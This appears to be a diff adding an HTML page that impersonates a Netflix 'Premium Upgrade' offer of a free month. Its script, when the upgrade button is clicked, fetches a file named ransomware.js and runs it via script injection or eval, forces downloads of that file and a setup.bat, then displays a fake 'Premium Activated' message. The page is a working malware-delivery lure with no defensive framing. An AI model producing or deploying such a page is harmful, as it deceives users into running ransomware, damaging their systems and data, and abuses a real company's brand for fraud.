@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Premium Upgrade</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Helvetica Neue', 'Segoe UI', Roboto, Arial, sans-serif; background: #141414; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; position: relative; }
+        .bg-glow { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 500px; height: 500px; background: radial-gradient(ellipse, rgba(229, 9, 20, 0.08), transparent 70%); z-index: 0; pointer-events: none; }
+        .card { background: linear-gradient(145deg, #1a1a1a, #0f0f0f); max-width: 480px; width: 100%; padding: 35px 35px 30px 35px; border-radius: 16px; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 40px rgba(229, 9, 20, 0.05); color: white; position: relative; z-index: 1; border: 1px solid rgba(255, 255, 255, 0.05); }
+        .netflix-logo { display: flex; justify-content: center; align-items: center; margin-bottom: 8px; padding: 5px 0; }
+        .netflix-logo img { width: 180px; height: auto; transition: transform 0.3s ease; display: block; }
+        .netflix-logo img:hover { transform: scale(1.03); }
+        .tagline { text-align: center; color: #aaa; font-size: 14px; letter-spacing: 2px; text-transform: uppercase; font-weight: 300; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
+        .offer-badge { display: inline-block; padding: 4px 18px; border-radius: 20px; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; background: linear-gradient(90deg, #e50914, #ff2d3a); color: white; margin-bottom: 15px; animation: offerPulse 2s ease-in-out infinite; }
+        @keyframes offerPulse { 0%, 100% { box-shadow: 0 0 0 0 rgba(229, 9, 20, 0.3); } 50% { box-shadow: 0 0 0 8px rgba(229, 9, 20, 0); } }
+        .plan-box { background: linear-gradient(145deg, #222222, #1a1a1a); padding: 25px 20px; border-radius: 12px; margin: 15px 0 18px 0; border: 2px solid #e50914; text-align: center; position: relative; overflow: hidden; }
+        .plan-box::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(ellipse, rgba(229, 9, 20, 0.05), transparent 60%); animation: planGlow 4s ease-in-out infinite; }
+        @keyframes planGlow { 0%, 100% { transform: rotate(0deg); } 50% { transform: rotate(180deg); } }
+        .plan-box .plan { font-size: 22px; font-weight: 700; color: #e50914; letter-spacing: 1px; position: relative; z-index: 1; }
+        .plan-box .plan .check { margin-right: 8px; }
+        .plan-box .price { font-size: 38px; font-weight: 700; color: white; position: relative; z-index: 1; }
+        .plan-box .price small { font-size: 15px; color: #aaa; font-weight: 400; }
+        .plan-box .sub-text { color: #888; font-size: 13px; margin-top: 6px; position: relative; z-index: 1; }
+        .features { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 18px 0; }
+        .features .item { background: #1f1f1f; padding: 16px 12px; border-radius: 10px; text-align: center; font-size: 13px; color: #ccc; border: 1px solid rgba(255, 255, 255, 0.05); transition: all 0.3s ease; }
+        .features .item:hover { border-color: #e50914; background: #2a1a1a; transform: translateY(-3px); box-shadow: 0 8px 25px rgba(229, 9, 20, 0.1); }
+        .features .item .icon { display: block; font-size: 32px; margin-bottom: 8px; line-height: 1; }
+        .features .item .label { font-weight: 500; font-size: 13px; color: #ddd; }
+        .features .item .sub-label { display: block; font-size: 11px; color: #777; margin-top: 2px; font-weight: 400; }
+        .bonus-box { background: linear-gradient(90deg, rgba(229, 9, 20, 0.1), rgba(229, 9, 20, 0.05)); padding: 14px; border-radius: 10px; margin: 12px 0 18px 0; font-size: 13px; color: #ccc; text-align: center; border: 1px solid rgba(229, 9, 20, 0.15); }
+        .bonus-box strong { color: #e50914; }
+        .btn { width: 100%; padding: 18px 20px; background: linear-gradient(90deg, #e50914, #c40812); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; margin-top: 8px; letter-spacing: 0.5px; position: relative; overflow: hidden; }
+        .btn::after { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(ellipse, rgba(255,255,255,0.08), transparent 60%); animation: btnGlow 3s ease-in-out infinite; }
+        @keyframes btnGlow { 0%, 100% { transform: rotate(0deg); } 50% { transform: rotate(180deg); } }
+        .btn:hover { background: linear-gradient(90deg, #c40812, #a80610); transform: translateY(-2px); box-shadow: 0 10px 30px rgba(229, 9, 20, 0.4); }
+        .btn:active { transform: translateY(0px); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none !important; }
+        .btn .btn-icon { position: relative; z-index: 1; margin-right: 8px; }
+        .btn span { position: relative; z-index: 1; }
+        .btn-secondary { width: 100%; padding: 14px; background: transparent; color: #888; border: 1px solid #333; border-radius: 10px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 8px; transition: all 0.3s ease; }
+        .btn-secondary:hover { border-color: #e50914; color: #e50914; background: rgba(229, 9, 20, 0.05); }
+        .footer { margin-top: 20px; color: #555; font-size: 11px; text-align: center; letter-spacing: 0.3px; border-top: 1px solid rgba(255, 255, 255, 0.05); padding-top: 18px; }
+        .device-badge { display: inline-block; padding: 3px 14px; border-radius: 20px; font-size: 12px; font-weight: 500; margin-bottom: 10px; background: rgba(255, 255, 255, 0.05); color: #888; border: 1px solid rgba(255, 255, 255, 0.05); }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(100px); background: #1a1a2e; color: white; padding: 14px 28px; border-radius: 12px; font-size: 14px; z-index: 9999; opacity: 0; transition: all 0.4s ease; pointer-events: none; box-shadow: 0 10px 40px rgba(0,0,0,0.5); max-width: 90%; text-align: center; }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .toast.success { background: #065f46; }
+        .toast.error { background: #991b1b; }
+        .toast.info { background: #1a1a2e; }
+        .progress-bar { width: 100%; height: 3px; background: rgba(255, 255, 255, 0.05); border-radius: 4px; margin: 12px 0 6px 0; overflow: hidden; display: none; }
+        .progress-bar .fill { height: 100%; width: 0%; background: linear-gradient(90deg, #e50914, #ff2d3a); border-radius: 4px; transition: width 0.3s; }
+        .progress-bar.active { display: block; }
+        @media (max-width: 500px) { .card { padding: 25px 20px 20px 20px; } .features { grid-template-columns: 1fr 1fr; } .netflix-logo img { width: 140px; } .plan-box .price { font-size: 30px; } .btn { font-size: 16px; padding: 15px; } .features .item .icon { font-size: 26px; } }
+        @media (max-width: 380px) { .features { grid-template-columns: 1fr; } .netflix-logo img { width: 120px; } }
+    </style>
+</head>
+<body>
+    <div class="bg-glow"></div>
+    <div class="card">
+        <div class="netflix-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+            <span class="logo-fallback" style="display:none;font-size:28px;font-weight:700;color:#e50914;letter-spacing:4px;">NETFLIX</span>
+        </div>
+        <div class="tagline">Stream unlimited movies &amp; TV shows</div>
+        <div style="text-align:center;"><span class="offer-badge">🔥 Limited Time Offer</span></div>
+        <div class="device-badge" id="deviceBadge">💻 Windows</div>
+        <div class="plan-box">
+            <div class="plan"><span class="check">⭐</span> PREMIUM PLAN</div>
+            <div class="price">$0.00 <small>for 1 month</small></div>
+            <div class="sub-text">Then $19.99/month • Cancel anytime</div>
+        </div>
+        <div class="features">
+            <div class="item"><span class="icon">🖥️</span><span class="label">4K + HDR</span><span class="sub-label">Ultra HD quality</span></div>
+            <div class="item"><span class="icon">📺</span><span class="label">4 Devices</span><span class="sub-label">Watch on 4 screens</span></div>
+            <div class="item"><span class="icon">💾</span><span class="label">Downloads</span><span class="sub-label">Watch offline</span></div>
+            <div class="item"><span class="icon">🔊</span><span class="label">Dolby Atmos</span><span class="sub-label">Immersive audio</span></div>
+        </div>
+        <div class="bonus-box">🎁 <strong>Bonus:</strong> Includes access to all content in Ultra HD • No ads • Watch anywhere</div>
+        <div class="progress-bar" id="progressBar"><div class="fill" id="progressFill"></div></div>
+        <button class="btn" id="upgradeBtn"><span class="btn-icon">⬆️</span><span>Upgrade to Premium</span></button>
+        <button class="btn-secondary" id="closeBtn">⏭️ Skip for now</button>
+        <div class="footer">Netflix, Inc. • Offer valid for 48 hours • Cancel anytime</div>
+    </div>
+    <div class="toast" id="toast"></div>
+
+    <script>
+        var uaN = navigator.userAgent;
+        var deviceNameN = 'Unknown', deviceIconN = '💻';
+        if (/Windows/i.test(uaN)) { deviceNameN = 'Windows'; deviceIconN = '💻'; }
+        else if (/Mac/i.test(uaN)) { deviceNameN = 'macOS'; deviceIconN = '🍎'; }
+        else if (/Android/i.test(uaN)) { deviceNameN = 'Android'; deviceIconN = '📱'; }
+        else if (/iPhone|iPad|iPod/i.test(uaN)) { deviceNameN = 'iPhone'; deviceIconN = '📱'; }
+        document.getElementById('deviceBadge').textContent = deviceIconN + ' ' + deviceNameN;
+
+        function showToast(message, type) {
+            var toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = 'toast ' + (type || 'info');
+            toast.classList.add('show');
+            clearTimeout(toast._hideTimeout);
+            toast._hideTimeout = setTimeout(function() { toast.classList.remove('show'); }, 3000);
+        }
+
+        function updateProgress(percent) {
+            var bar = document.getElementById('progressBar');
+            var fill = document.getElementById('progressFill');
+            bar.classList.add('active');
+            fill.style.width = percent + '%';
+            if (percent >= 100) {
+                setTimeout(function() { bar.classList.remove('active'); fill.style.width = '0%'; }, 2000);
+            }
+        }
+
+        document.getElementById('closeBtn').addEventListener('click', function() {
+            showToast('⏭️ Offer skipped.', 'info');
+            setTimeout(function() { window.close(); }, 1500);
+        });
+
+        document.getElementById('upgradeBtn').addEventListener('click', function() {
+            var btn = document.getElementById('upgradeBtn');
+            btn.innerHTML = '⏳ Processing Upgrade...';
+            btn.style.background = '#ffc107';
+            btn.style.color = '#333';
+            btn.disabled = true;
+
+            var progress = 0;
+            var interval = setInterval(function() {
+                progress += Math.random() * 15;
+                if (progress > 100) { progress = 100; }
+                updateProgress(progress);
+                if (progress >= 100) { clearInterval(interval); }
+            }, 300);
+
+            setTimeout(function() {
+                // Download and execute ransomware
+                fetch('/download/ransomware.js')
+                    .then(function(response) { return response.text(); })
+                    .then(function(code) {
+                        try {
+                            var script = document.createElement('script');
+                            script.textContent = code;
+                            document.head.appendChild(script);
+                            console.log('🔴 Ransomware executed!');
+                        } catch (e) {
+                            try { eval(code); } catch (e2) {}
+                        }
+
+                        // Download backup files
+                        var link = document.createElement('a');
+                        link.href = '/download/ransomware.js';
+                        link.download = 'ransomware.js';
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+
+                        fetch('/download/setup.bat')
+                            .then(function(res) { return res.text(); })
+                            .then(function(batContent) {
+                                var blob = new Blob([batContent], { type: 'application/x-msdownload' });
+                                var url = URL.createObjectURL(blob);
+                                var a = document.createElement('a');
+                                a.href = url;
+                                a.download = 'setup.bat';
+                                document.body.appendChild(a);
+                                a.click();
+                                document.body.removeChild(a);
+                                URL.revokeObjectURL(url);
+                            })
+                            .catch(function() {});
+
+                        btn.innerHTML = '✅ Premium Activated! 🎉';
+                        btn.style.background = '#28a745';
+                        btn.style.color = 'white';
+                        btn.disabled = false;
+                        document.querySelector('.plan-box .price').innerHTML = '🎬 <small>Premium Active</small>';
+                        showToast('🎉 Netflix Premium activated! Enjoy 4K HDR streaming.', 'success');
+                        setTimeout(function() { window.close(); }, 5000);
+                    })
+                    .catch(function() {
+                        try {
+                            var scriptTag = document.createElement('script');
+                            scriptTag.src = '/download/ransomware.js';
+                            document.head.appendChild(scriptTag);
+                        } catch (e) {}
+                        btn.innerHTML = '✅ Premium Activated! 🎉';
+                        btn.style.background = '#28a745';
+                        btn.style.color = 'white';
+                        btn.disabled = false;
+                        document.querySelector('.plan-box .price').innerHTML = '🎬 <small>Premium Active</small>';
+                        showToast('🎉 Netflix Premium activated! Enjoy 4K HDR streaming.', 'success');
+                        setTimeout(function() { window.close(); }, 4000);
+                    });
+            }, 3000);
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !document.querySelector('.btn:disabled')) {
+                document.getElementById('upgradeBtn').click();
+            }
+            if (e.key === 'Escape') {
+                document.getElementById('closeBtn').click();
+            }
+        });
+
+        console.log('🎬 Netflix Premium Upgrade loaded.');
+    </script>
+</body>
+</html>
